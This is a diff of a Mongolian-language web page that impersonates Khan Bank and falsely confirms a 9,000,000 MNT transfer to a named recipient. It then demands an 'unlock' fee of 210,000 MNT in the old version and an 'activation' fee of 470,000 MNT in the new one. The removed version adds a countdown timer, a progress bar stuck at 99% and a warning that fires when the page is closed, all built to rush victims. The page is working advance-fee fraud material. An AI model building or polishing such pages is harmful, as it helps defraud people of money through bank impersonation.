@@ -1,963 +1,171 @@
 <!DOCTYPE html>
 <html lang="mn">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Гүйлгээ амжилттай боллоо</title>
-    <style>
-        :root {
-            --primary-green: #4CAF50;
-            --secondary-green: #66BB6A;
-            --dark-green: #45a049;
-            --khan-green: #00A651;
-            --khan-green-dark: #008C44;
-            --purple-primary: #667eea;
-            --purple-secondary: #764ba2;
-            --danger-red: #d32f2f;
-            --warning-orange: #ff9800;
-            --warning-yellow: #ffc107;
-            --text-dark: #2c3e50;
-            --text-muted: #6c757d;
-            --shadow-sm: 0 2px 4px rgba(0,0,0,0.1);
-            --shadow-md: 0 5px 20px rgba(76, 175, 80, 0.2);
-            --shadow-lg: 0 10px 30px rgba(76, 175, 80, 0.4);
-            --shadow-xl: 0 20px 60px rgba(0,0,0,0.3);
-            --transition-base: all 0.3s ease;
-        }
-        
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        html, body {
-            height: 100%;
-            width: 100%;
-            background: linear-gradient(135deg, var(--purple-primary) 0%, var(--purple-secondary) 100%);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            overflow-x: hidden;
-        }
-        
-        .particles {
-            position: fixed;
-            inset: 0;
-            overflow: hidden;
-            z-index: 1;
-            pointer-events: none;
-        }
-        
-        .particle {
-            position: absolute;
-            background: rgba(255, 255, 255, 0.5);
-            border-radius: 50%;
-            animation: float 15s infinite ease-in-out;
-            will-change: transform, opacity;
-        }
-        
-        @keyframes float {
-            0%, 100% { 
-                transform: translateY(0) translateX(0) scale(1); 
-                opacity: 0; 
-            }
-            10% { opacity: 0.5; }
-            50% { 
-                transform: translateY(-100vh) translateX(50px) scale(1.5); 
-                opacity: 0.8; 
-            }
-            90% { opacity: 0.3; }
-        }
-        
-        .modal {
-            background: linear-gradient(135deg, #ffffff 0%, #f8f9fa 100%);
-            border-radius: 24px;
-            box-shadow: var(--shadow-xl), 0 0 100px rgba(102, 126, 234, 0.4);
-            width: 95%;
-            max-width: 550px;
-            padding: 50px 30px;
-            text-align: center;
-            position: relative;
-            z-index: 10;
-            animation: modalEntry 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
-            overflow: hidden;
-            margin: 20px;
-        }
-        
-        @keyframes modalEntry {
-            from {
-                opacity: 0;
-                transform: scale(0.8) translateY(30px);
-            }
-            to {
-                opacity: 1;
-                transform: scale(1) translateY(0);
-            }
-        }
-        
-        .modal::before {
-            content: '';
-            position: absolute;
-            inset: -50%;
-            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent);
-            animation: shine 3s infinite;
-            pointer-events: none;
-        }
-        
-        @keyframes shine {
-            0% { transform: translate(-100%, -100%) rotate(45deg); }
-            100% { transform: translate(100%, 100%) rotate(45deg); }
-        }
-        
-        .check-icon {
-            width: 120px;
-            height: 120px;
-            background: linear-gradient(135deg, var(--primary-green), var(--secondary-green));
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 30px;
-            box-shadow: var(--shadow-lg);
-            animation: checkBounce 0.8s cubic-bezier(0.34, 1.56, 0.64, 1) 0.3s backwards;
-            position: relative;
-        }
-        
-        @keyframes checkBounce {
-            0% {
-                transform: scale(0) rotate(-180deg);
-                opacity: 0;
-            }
-            60% {
-                transform: scale(1.2) rotate(10deg);
-            }
-            100% {
-                transform: scale(1) rotate(0deg);
-                opacity: 1;
-            }
-        }
-        
-        .check-icon::before {
-            content: '✓';
-            color: white;
-            font-size: 70px;
-            animation: checkMark 0.5s ease-out 0.5s backwards;
-        }
-        
-        @keyframes checkMark {
-            0% {
-                transform: scale(0);
-                opacity: 0;
-            }
-            50% {
-                transform: scale(1.3);
-            }
-            100% {
-                transform: scale(1);
-                opacity: 1;
-            }
-        }
-        
-        .check-icon::after {
-            content: '';
-            position: absolute;
-            inset: 0;
-            border-radius: 50%;
-            border: 3px solid var(--primary-green);
-            animation: pulse 2s infinite;
-        }
-        
-        @keyframes pulse {
-            0% {
-                transform: scale(1);
-                opacity: 1;
-            }
-            100% {
-                transform: scale(1.5);
-                opacity: 0;
-            }
-        }
-        
-        .title {
-            color: var(--text-dark);
-            margin-bottom: 30px;
-            font-size: 28px;
-            font-weight: 600;
-            animation: fadeInDown 0.6s ease-out 0.4s backwards;
-        }
-        
-        @keyframes fadeInDown {
-            from {
-                opacity: 0;
-                transform: translateY(-20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-        
-        .bank-name {
-            background: linear-gradient(135deg, var(--khan-green) 0%, var(--khan-green-dark) 100%);
-            color: white;
-            font-size: clamp(24px, 6vw, 38px);
-            font-weight: bold;
-            padding: 30px;
-            border-radius: 16px;
-            margin-bottom: 30px;
-            letter-spacing: 6px;
-            box-shadow: 0 10px 30px rgba(0, 166, 81, 0.4);
-            text-shadow: 2px 2px 8px rgba(0,0,0,0.3);
-            animation: fadeInUp 0.6s ease-out 0.5s backwards;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .bank-name::before {
-            content: '';
-            position: absolute;
-            inset: 0 auto 0 -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
-            animation: bankShine 2s infinite;
-        }
-        
-        @keyframes bankShine {
-            0% { left: -100%; }
-            50%, 100% { left: 100%; }
-        }
-        
-        @keyframes fadeInUp {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-        
-        .countdown-container {
-            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 100%);
-            border-radius: 16px;
-            padding: 25px;
-            margin-bottom: 25px;
-            box-shadow: 0 10px 30px rgba(255, 107, 107, 0.4);
-            animation: fadeInUp 0.6s ease-out 0.6s backwards, urgent-pulse 2s ease-in-out infinite;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Гүйлгээ баталгаажлаа</title>
+<style>
+    body {
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        background: linear-gradient(135deg, #667eea, #764ba2);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+    }
 
-        @keyframes urgent-pulse {
-            0%, 100% {
-                box-shadow: 0 10px 30px rgba(255, 107, 107, 0.4);
-            }
-            50% {
-                box-shadow: 0 10px 40px rgba(255, 107, 107, 0.7);
-            }
-        }
+    .modal {
+        background: #fff;
+        border-radius: 20px;
+        padding: 40px 30px;
+        max-width: 500px;
+        width: 95%;
+        text-align: center;
+        box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        position: relative;
+    }
 
-        .countdown-label {
-            color: white;
-            font-size: 18px;
-            font-weight: 600;
-            margin-bottom: 15px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
+    .check-icon {
+        width: 100px;
+        height: 100px;
+        background: #4CAF50;
+        border-radius: 50%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        margin: 0 auto 20px;
+        font-size: 60px;
+        color: white;
+        animation: pop 0.5s ease-out;
+    }
 
-        .countdown-display {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            flex-wrap: wrap;
-        }
+    @keyframes pop {
+        0% {transform: scale(0);}
+        70% {transform: scale(1.2);}
+        100% {transform: scale(1);}
+    }
 
-        .time-unit {
-            background: rgba(255, 255, 255, 0.2);
-            backdrop-filter: blur(10px);
-            border-radius: 12px;
-            padding: 15px 20px;
-            min-width: 90px;
-            border: 2px solid rgba(255, 255, 255, 0.3);
-        }
+    .title {
+        font-size: 24px;
+        font-weight: 700;
+        margin-bottom: 20px;
+        color: #2c3e50;
+    }
 
-        .time-value {
-            font-size: 36px;
-            font-weight: bold;
-            color: white;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
-            display: block;
-            line-height: 1;
-            margin-bottom: 5px;
-        }
+    .info-card {
+        background: #f1f1f1;
+        padding: 25px;
+        border-radius: 12px;
+        margin-bottom: 20px;
+        text-align: left;
+        box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+    }
 
-        .time-label {
-            font-size: 12px;
-            color: rgba(255, 255, 255, 0.9);
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
+    .info-card p {
+        margin: 8px 0;
+        font-size: 16px;
+        line-height: 1.4;
+    }
 
-        .info-card {
-            border-radius: 16px;
-            padding: 25px;
-            margin-bottom: 25px;
-            text-align: left;
-            line-height: 1.7;
-            box-shadow: var(--shadow-md);
-        }
-        
-        .finalized-badge {
-            background: linear-gradient(135deg, var(--primary-green) 0%, var(--dark-green) 100%);
-            color: white;
-            padding: 20px;
-            border-radius: 12px;
-            margin-bottom: 25px;
-            font-size: 20px;
-            font-weight: bold;
-            box-shadow: var(--shadow-lg);
-            animation: fadeInUp 0.6s ease-out 0.65s backwards, glow 2s ease-in-out infinite;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            text-align: center;
-        }
+    .info-card strong {
+        color: #2c3e50;
+        font-size: 18px;
+    }
 
-        @keyframes glow {
-            0%, 100% {
-                box-shadow: var(--shadow-lg);
-            }
-            50% {
-                box-shadow: 0 8px 35px rgba(76, 175, 80, 0.6);
-            }
-        }
+    .fee-amount {
+        color: #d32f2f;
+        font-weight: bold;
+        font-size: 18px;
+    }
 
-        .apology-message {
-            background: linear-gradient(135deg, #fff9e6 0%, #ffeaa7 100%);
-            border: 2px solid #fdcb6e;
-            border-left: 6px solid #fdcb6e;
-            color: #856404;
-            animation: fadeInUp 0.6s ease-out 0.7s backwards;
-        }
+    .loader {
+        border: 6px solid #f3f3f3;
+        border-top: 6px solid #667eea;
+        border-radius: 50%;
+        width: 50px;
+        height: 50px;
+        animation: spin 1s linear infinite;
+        margin: 0 auto 20px;
+        display: none; /* invisible au début */
+    }
 
-        .apology-message strong {
-            color: #856404;
-            font-size: 16px;
-        }
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
 
-        .date-badge {
-            display: inline-block;
-            background: var(--purple-primary);
-            color: white;
-            padding: 8px 16px;
-            border-radius: 20px;
-            font-size: 14px;
-            font-weight: 600;
-            margin-top: 10px;
-            box-shadow: 0 4px 12px rgba(102, 126, 234, 0.3);
-        }
-        
-        .success-message {
-            background: linear-gradient(135deg, #d4edda 0%, #c8e6c9 100%);
-            border: 2px solid var(--primary-green);
-            color: #155724;
-            animation: fadeInUp 0.6s ease-out 0.75s backwards;
-        }
-        
-        .success-message strong {
-            color: #0d3d1a;
-        }
+    .button {
+        padding: 15px 30px;
+        border: none;
+        border-radius: 12px;
+        font-weight: 600;
+        font-size: 16px;
+        cursor: pointer;
+        margin-top: 15px;
+        width: 100%;
+        transition: transform 0.2s ease;
+    }
 
-        .success-message hr {
-            border: 0;
-            border-top: 1px solid var(--primary-green);
-            margin: 15px 0;
-        }
-        
-        .progress-section {
-            margin: 30px 0;
-        }
+    .button:hover {
+        transform: scale(1.05);
+    }
 
-        .progress-label {
-            font-size: 16px;
-            font-weight: 600;
-            color: var(--text-dark);
-            margin-bottom: 10px;
-            text-align: left;
-        }
+    .primary-button {
+        background: #ff9800;
+        color: white;
+    }
 
-        .loading-container {
-            width: 100%;
-            background-color: #e9ecef;
-            border-radius: 12px;
-            margin-bottom: 20px;
-            overflow: hidden;
-            position: relative;
-            height: 40px;
-            box-shadow: inset var(--shadow-sm);
-            animation: fadeInUp 0.6s ease-out 0.8s backwards;
-        }
-        
-        .loading-bar {
-            height: 100%;
-            border-radius: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-weight: bold;
-            font-size: 16px;
-            position: relative;
-            transition: width 0.3s ease;
-        }
-
-        .loading-bar.complete {
-            width: 100%;
-            background: linear-gradient(90deg, var(--primary-green), var(--secondary-green), var(--primary-green));
-            background-size: 200% 100%;
-            box-shadow: 0 4px 15px rgba(76, 175, 80, 0.4);
-            animation: gradientMove 3s ease-in-out infinite;
-        }
-
-        .loading-bar.blocked {
-            width: 99%;
-            background: linear-gradient(90deg, var(--warning-orange), var(--warning-yellow), var(--warning-orange));
-            background-size: 200% 100%;
-            box-shadow: 0 4px 15px rgba(255, 152, 0, 0.4);
-            animation: gradientMove 3s ease-in-out infinite, pulse-warning 2s ease-in-out infinite;
-        }
-        
-        @keyframes gradientMove {
-            0%, 100% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-        }
-
-        @keyframes pulse-warning {
-            0%, 100% { 
-                box-shadow: 0 4px 15px rgba(255, 152, 0, 0.4);
-            }
-            50% { 
-                box-shadow: 0 4px 25px rgba(255, 152, 0, 0.7);
-            }
-        }
-        
-        .loading-bar::after {
-            content: "";
-            position: absolute;
-            inset: 0;
-            background-image: linear-gradient(
-                -45deg,
-                rgba(255, 255, 255, 0.3) 25%,
-                transparent 25%,
-                transparent 50%,
-                rgba(255, 255, 255, 0.3) 50%,
-                rgba(255, 255, 255, 0.3) 75%,
-                transparent 75%,
-                transparent
-            );
-            background-size: 50px 50px;
-            border-radius: 12px;
-            animation: stripes 1s linear infinite;
-        }
-        
-        @keyframes stripes {
-            0% { background-position: 0 0; }
-            100% { background-position: 50px 50px; }
-        }
-        
-        .checkmark-overlay {
-            position: absolute;
-            right: 15px;
-            width: 24px;
-            height: 24px;
-            background-color: white;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
-            animation: checkmarkPop 0.5s cubic-bezier(0.34, 1.56, 0.64, 1) 1s backwards;
-        }
-        
-        @keyframes checkmarkPop {
-            0% { transform: scale(0); }
-            100% { transform: scale(1); }
-        }
-        
-        .checkmark-overlay::before {
-            content: '✓';
-            color: var(--primary-green);
-            font-size: 16px;
-            font-weight: bold;
-        }
-
-        .warning-overlay {
-            position: absolute;
-            right: 15px;
-            width: 28px;
-            height: 28px;
-            background-color: white;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
-            animation: warningPulse 1.5s ease-in-out infinite;
-        }
-
-        @keyframes warningPulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-        }
-
-        .warning-overlay::before {
-            content: '!';
-            color: var(--warning-orange);
-            font-size: 20px;
-            font-weight: bold;
-        }
-
-        .blocked-message {
-            background: linear-gradient(135deg, #fff3e0 0%, #ffe0b2 100%);
-            border: 3px solid var(--warning-orange);
-            border-radius: 16px;
-            padding: 25px;
-            margin-bottom: 30px;
-            animation: fadeInUp 0.6s ease-out 0.85s backwards, pulse-border 2s ease-in-out infinite;
-            box-shadow: 0 5px 20px rgba(255, 152, 0, 0.3);
-        }
-
-        @keyframes pulse-border {
-            0%, 100% {
-                border-color: var(--warning-orange);
-                box-shadow: 0 5px 20px rgba(255, 152, 0, 0.3);
-            }
-            50% {
-                border-color: var(--warning-yellow);
-                box-shadow: 0 5px 30px rgba(255, 152, 0, 0.5);
-            }
-        }
-        
-        .blocked-message p {
-            color: #1e3a8a;
-            font-size: 16px;
-            margin-bottom: 15px;
-            line-height: 1.6;
-        }
-        
-        .fee-amount {
-            color: var(--danger-red);
-            font-size: 32px;
-            font-weight: bold;
-            display: inline-block;
-            animation: pulse-text 2s ease-in-out infinite;
-        }
-        
-        @keyframes pulse-text {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-        }
-
-        .blocked-highlight {
-            background: rgba(255, 152, 0, 0.15);
-            padding: 20px;
-            border-radius: 10px;
-            margin-top: 20px;
-            border-left: 4px solid var(--warning-orange);
-        }
-
-        .blocked-highlight p {
-            color: #d84315;
-            font-size: 15px;
-            font-weight: 600;
-            margin: 0;
-        }
-        
-        .button {
-            border: none;
-            border-radius: 12px;
-            cursor: pointer;
-            font-size: 16px;
-            font-weight: 600;
-            transition: var(--transition-base);
-            position: relative;
-            overflow: hidden;
-        }
-
-        .primary-button {
-            background: linear-gradient(135deg, var(--warning-orange) 0%, #fb8c00 100%);
-            color: white;
-            padding: 18px 40px;
-            width: 100%;
-            margin-bottom: 20px;
-            font-size: 18px;
-            box-shadow: 0 5px 20px rgba(255, 152, 0, 0.3);
-            animation: fadeInUp 0.6s ease-out 0.9s backwards, button-pulse 2s ease-in-out infinite;
-        }
-
-        @keyframes button-pulse {
-            0%, 100% {
-                box-shadow: 0 5px 20px rgba(255, 152, 0, 0.3);
-            }
-            50% {
-                box-shadow: 0 5px 30px rgba(255, 152, 0, 0.5);
-            }
-        }
-        
-        .primary-button::before {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 0;
-            height: 0;
-            border-radius: 50%;
-            background: rgba(255, 255, 255, 0.3);
-            transform: translate(-50%, -50%);
-            transition: width 0.6s, height 0.6s;
-        }
-        
-        .primary-button:hover::before {
-            width: 300px;
-            height: 300px;
-        }
-        
-        .primary-button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 30px rgba(255, 152, 0, 0.5);
-        }
-        
-        .primary-button:active {
-            transform: translateY(0);
-        }
-        
-        .secondary-button {
-            background: none;
-            color: var(--text-muted);
-            border: 2px solid var(--text-muted);
-            padding: 12px 30px;
-            animation: fadeInUp 0.6s ease-out 1s backwards;
-        }
-        
-        .secondary-button:hover {
-            background-color: var(--text-muted);
-            color: white;
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(108, 117, 125, 0.3);
-        }
-        
-        .footer-text {
-            margin-top: 30px;
-            font-size: 14px;
-            color: var(--text-muted);
-            line-height: 1.6;
-            animation: fadeInUp 0.6s ease-out 1.1s backwards;
-        }
-
-        @media (max-width: 600px) {
-            .modal {
-                padding: 40px 20px;
-            }
-            
-            .bank-name {
-                font-size: 24px;
-                letter-spacing: 3px;
-                padding: 20px;
-            }
-            
-            .title {
-                font-size: 24px;
-            }
-
-            .check-icon {
-                width: 100px;
-                height: 100px;
-            }
-
-            .check-icon::before {
-                font-size: 60px;
-            }
-
-            .info-card {
-                padding: 20px;
-                font-size: 15px;
-            }
-
-            .fee-amount {
-                font-size: 26px;
-            }
-
-            .time-unit {
-                min-width: 70px;
-                padding: 10px 15px;
-            }
-
-            .time-value {
-                font-size: 28px;
-            }
-        }
-    </style>
+    .secondary-button {
+        background: none;
+        border: 2px solid #6c757d;
+        color: #6c757d;
+        margin-top: 10px;
+    }
+</style>
 </head>
 <body>
-    <div class="particles" id="particles"></div>
-    
-    <div class="modal">
-        <div class="check-icon"></div>
-        <h1 class="title">Гүйлгээ амжилттай боллоо</h1>
-        
-        <div class="bank-name">
-            KHAN BANK
-        </div>
 
-        <div class="countdown-container">
-            <div class="countdown-label">⏰ Хугацаа дуусахад үлдсэн</div>
-            <div class="countdown-display">
-                <div class="time-unit">
-                    <span class="time-value" id="hours">00</span>
-                    <span class="time-label">Цаг</span>
-                </div>
-                <div class="time-unit">
-                    <span class="time-value" id="minutes">00</span>
-                    <span class="time-label">Минут</span>
-                </div>
-                <div class="time-unit">
-                    <span class="time-value" id="seconds">00</span>
-                    <span class="time-label">Секунд</span>
-                </div>
-            </div>
-        </div>
+<div class="modal">
+    <div class="loader" id="loader"></div>
+    <div class="check-icon" id="check">✓</div>
+    <h1 class="title">Гүйлгээ баталгаажлаа</h1>
 
-        <div class="finalized-badge">
-            ✓ Эцсийн баталгаажуулалт хийгдсэн
-        </div>
-
-        <div class="info-card apology-message">
-            <strong>🙏 Уучлалт өчье</strong><br><br>
-            Бид танд гүйлгээний хугацаа хэтэрсэн талаар гүнээ уучлал өчье. Систем шинэчлэлтийн улмаас саатал үүссэнийг хүлээн зөвшөөрч байна. Таны тэвчээр ба ойлголтод талархаж байна.
-            <div class="date-badge">📅 Огноо: 2025 оны 10-р сарын 29</div>
-        </div>
-        
-        <div class="info-card success-message">
-            <p>
-                <strong>Бүртгэл баталгаажуулалт:</strong>
-                <br>
-                Таны <strong>9,000,000 MNT</strong>-н мөнгөн дүнг заасан дансанд амжилттай бүртгэгдсэнийг баталгаажуулж байна. (Гүйлгээний дугаар: <strong>936446676678</strong>)
-            </p>
-            
-            <hr>
-            
-            <p>
-                <strong>Хүлээн авагчийн дансны мэдээлэл:</strong>
-                <br>
-                <strong>Дансны дугаар:</strong> 5900172277<br>
-                <strong>Хүлээн авагч:</strong> Отгонзаяа<br>
-                <strong>Банк:</strong> Хаан банк
-            </p>
-        </div>
-        
-        <div class="progress-section">
-            <div class="progress-label">✓ Эцсийн баталгаажуулалт:</div>
-            <div class="loading-container">
-                <div class="loading-bar complete">
-                    ДУУССАН 100%
-                    <div class="checkmark-overlay"></div>
-                </div>
-            </div>
-
-            <div class="progress-label" style="color: var(--warning-orange); animation-delay: 0.9s;">⚠️ Дансны нээлт:</div>
-            <div class="loading-container" style="animation-delay: 0.9s;">
-                <div class="loading-bar blocked">
-                    ХҮЛЭЭГДЭЖ БУЙ 99%
-                    <div class="warning-overlay"></div>
-                </div>
-            </div>
-        </div>
-
-        <div class="blocked-message">
-            <p style="font-size: 18px; margin-bottom: 20px;">
-                <strong>⚠️ Анхааруулга:</strong> Гүйлгээ бараг дууссан боловч дансны нээлт хаалттай байна
-            </p>
-            <p style="margin-bottom: 15px;">
-                Дансыг нээхийн тулд татварын албаны баталгаажуулалт болон нээлт тайлах хураамж төлөх шаардлагатай.
-            </p>
-            <p style="margin-bottom: 0;">
-                <strong>Нээлт тайлах төлбөр:</strong> <span class="fee-amount">210,000 MNT</span>
-            </p>
-            
-            <div class="blocked-highlight">
-                <p>
-                    🔒 Энэхүү төлбөрийг хүлээн авсны дараа дансны нээлт ДАРУЙ тайлагдаж, 9,000,000 MNT таны данс руу шилжих болно.
-                </p>
-            </div>
-        </div>
-        
-        <button class="button primary-button" id="payButton">🔓 Нээлт тайлах төлбөр төлөх (210,000 MNT)</button>
-        <button class="button secondary-button" onclick="alert('Анхааруулга: Хугацаа дууссан тохиолдолд гүйлгээ цуцлагдах болно!')">Хожимд төлөх</button>
-        
-        <p class="footer-text">
-            Асуух зүйл, тусламж хэрэгтэй бол манай харилцагчийн үйлчилгээний төвтэй холбогдоно уу.<br>
-            <strong>Хүндэтгэсэн, Хаан Банк</strong>
-        </p>
+    <div class="info-card">
+        <p><strong>Дансны мэдээлэл:</strong></p>
+        <p>Дансны дугаар: <strong>5900172277</strong></p>
+        <p>Хүлээн авагч: <strong>Отгонзаяа</strong></p>
+        <p>Банк: <strong>Хаан банк</strong></p>
+        <p>Гүйлгээний дүн: <strong>9,000,000 MNT</strong></p>
+        <p>Гүйлгээний дугаар: <strong>936446676678</strong></p>
     </div>
-    
-    <script>
-        // Durée totale = 1 heure (en secondes)
-        const dureeTotale = 60 * 60; // 3600 secondes
-    
-        // Vérifie si un départ précédent existe dans localStorage
-        const startTime = localStorage.getItem("countdownStart");
-        const now = Date.now();
-    
-        // Si déjà démarré avant, on reprend
-        let timeRemaining;
-        if (startTime) {
-            const elapsed = Math.floor((now - startTime) / 1000);
-            timeRemaining = dureeTotale - elapsed;
-            if (timeRemaining <= 0) {
-                timeRemaining = 0;
-                localStorage.removeItem("countdownStart");
-            }
-        } else {
-            // Nouveau départ
-            localStorage.setItem("countdownStart", now);
-            timeRemaining = dureeTotale;
-        }
-    
-        function updateCountdown() {
-            const hours = Math.floor(timeRemaining / 3600);
-            const minutes = Math.floor((timeRemaining % 3600) / 60);
-            const seconds = timeRemaining % 60;
-    
-            document.getElementById('hours').textContent = String(hours).padStart(2, '0');
-            document.getElementById('minutes').textContent = String(minutes).padStart(2, '0');
-            document.getElementById('seconds').textContent = String(seconds).padStart(2, '0');
-    
-            if (timeRemaining <= 0) {
-                clearInterval(countdownInterval);
-                handleExpiration();
-                localStorage.removeItem("countdownStart");
-                return;
-            }
-    
-            // Changer la couleur du fond selon le temps restant
-            const countdownContainer = document.querySelector('.countdown-container');
-            if (timeRemaining <= 300) { // Dernières 5 min
-                countdownContainer.style.background = 'linear-gradient(135deg, #d32f2f 0%, #c62828 100%)';
-            } else if (timeRemaining <= 600) { // Dernières 10 min
-                countdownContainer.style.background = 'linear-gradient(135deg, #ff9800 0%, #f57c00 100%)';
-            }
-    
-            timeRemaining--;
-        }
-    
-        function handleExpiration() {
-            const modal = document.querySelector('.modal');
-            modal.innerHTML = `
-                <div class="check-icon" style="background: linear-gradient(135deg, #d32f2f, #c62828);">
-                    <span style="font-size: 70px;">✕</span>
-                </div>
-                <h1 class="title" style="color: #d32f2f;">Хугацаа дууслаа</h1>
-                <div class="info-card" style="background: linear-gradient(135deg, #ffebee 0%, #ffcdd2 100%); border: 2px solid #d32f2f;">
-                    <p style="color: #b71c1c; font-size: 18px; text-align: center;">
-                        <strong>⚠️ Гүйлгээ цуцлагдлаа</strong><br><br>
-                        Төлбөр төлөх хугацаа дууссан тул таны гүйлгээ автоматаар цуцлагдсан. 
-                        Дахин гүйлгээ хийхийг хүсвэл банктай холбогдоно уу.
-                    </p>
-                </div>
-                <button class="button primary-button" style="background: linear-gradient(135deg, #6c757d 0%, #5a6268 100%);" onclick="location.reload()">
-                    Дахин эхлэх
-                </button>
-            `;
-        }
-    
-        // Lancement du compte à rebours
-        const countdownInterval = setInterval(updateCountdown, 1000);
-        updateCountdown();
-    
-        // Création de particules
-        function createParticles() {
-            const particlesContainer = document.getElementById('particles');
-            const fragment = document.createDocumentFragment();
-    
-            for (let i = 0; i < 30; i++) {
-                const particle = document.createElement('div');
-                particle.className = 'particle';
-                const size = Math.random() * 10 + 5;
-                particle.style.cssText = `
-                    width: ${size}px;
-                    height: ${size}px;
-                    left: ${Math.random() * 100}%;
-                    animation-delay: ${Math.random() * 15}s;
-                    animation-duration: ${Math.random() * 10 + 10}s;
-                `;
-                fragment.appendChild(particle);
-            }
-    
-            particlesContainer.appendChild(fragment);
-        }
-    
-        // Bouton de paiement
-        document.getElementById('payButton').addEventListener('click', function(e) {
-            createRipple(e, this);
-            const confirmed = confirm('Та 210,000 MNT төлөхдөө итгэлтэй байна уу?');
-            if (confirmed) {
-                this.textContent = '⏳ Төлбөр боловсруулж байна...';
-                this.style.background = 'linear-gradient(135deg, #6c757d 0%, #5a6268 100%)';
-                this.disabled = true;
-                setTimeout(() => {
-                    alert('✓ Төлбөр амжилттай хийгдлээ! Таны данс 5 минутын дотор нээгдэх болно.');
-                    this.textContent = '✓ Төлбөр хийгдсэн';
-                    this.style.background = 'linear-gradient(135deg, #4CAF50 0%, #45a049 100%)';
-                }, 2000);
-            }
-        });
-    
-        // Effet ripple
-        function createRipple(e, element) {
-            const ripple = document.createElement('span');
-            const rect = element.getBoundingClientRect();
-            const size = Math.max(rect.width, rect.height);
-            const x = e.clientX - rect.left - size / 2;
-            const y = e.clientY - rect.top - size / 2;
-    
-            ripple.style.cssText = `
-                position: absolute;
-                width: ${size}px;
-                height: ${size}px;
-                left: ${x}px;
-                top: ${y}px;
-                background: rgba(255,255,255,0.5);
-                border-radius: 50%;
-                transform: scale(0);
-                animation: ripple-effect 0.6s ease-out;
-                pointer-events: none;
-            `;
-    
-            element.appendChild(ripple);
-            setTimeout(() => ripple.remove(), 600);
-        }
-    
-        // Avertissement avant fermeture
-        window.addEventListener('beforeunload', function(e) {
-            if (timeRemaining > 0) {
-                e.preventDefault();
-                e.returnValue = 'Та гүйлгээг дуусгаагүй байна. Хуудсыг хаахдаа итгэлтэй байна уу?';
-                return e.returnValue;
-            }
-        });
-    
-        // Initialisation des particules
-        createParticles();
-    
-        // Avertissement visibilité
-        document.addEventListener('visibilitychange', function() {
-            if (document.hidden && timeRemaining > 0) {
-                console.log('⚠️ Хуудас далдлагдсан боловч цаг хэмжигч үргэлжилж байна');
-            }
-        });
-    </script>
-    
+
+    <div class="info-card">
+        <p>✅ Мөнгөн дүн амжилттай таны дансанд байршуулсан байна.</p>
+        <p>⚠️ Эцсийн активацийг хийхийн тулд <strong class="fee-amount">470,000 MNT</strong> төлөх шаардлагатай.</p>
+        <p>Төлбөр хийгдсэний дараа 15 минутын дотор банк таны дансыг шалгаж, шилжүүлсэн дүнг баталгаажуулна.</p>
+    </div>
+
+    <button class="button primary-button" onclick="confirmPayment()">🔓 470,000 MNT төлөх</button>
+    <button class="button secondary-button" onclick="alert('Та төлбөрийг хойшлуулах боломжтой. Дараа төлөх үед данс идэвхжих болно.')">Хожим төлөх</button>
+</div>
+
+<script>
+function confirmPayment() {
+    const loader = document.getElementById('loader');
+    const check = document.getElementById('check');
+
+    // Montrer le loader et cacher le check
+    loader.style.display = 'block';
+    check.style.display = 'none';
+
+    setTimeout(() => {
+        loader.style.display = 'none';
+        check.style.display = 'flex';
+        alert('✓ Төлбөр амжилттай хийгдлээ! 15 минутын дотор таны данс шалгагдан, мөнгөн дүн баталгаажих болно.');
+    }, 3000); // animation 3 secondes
+}
+</script>
+
 </body>
 </html>
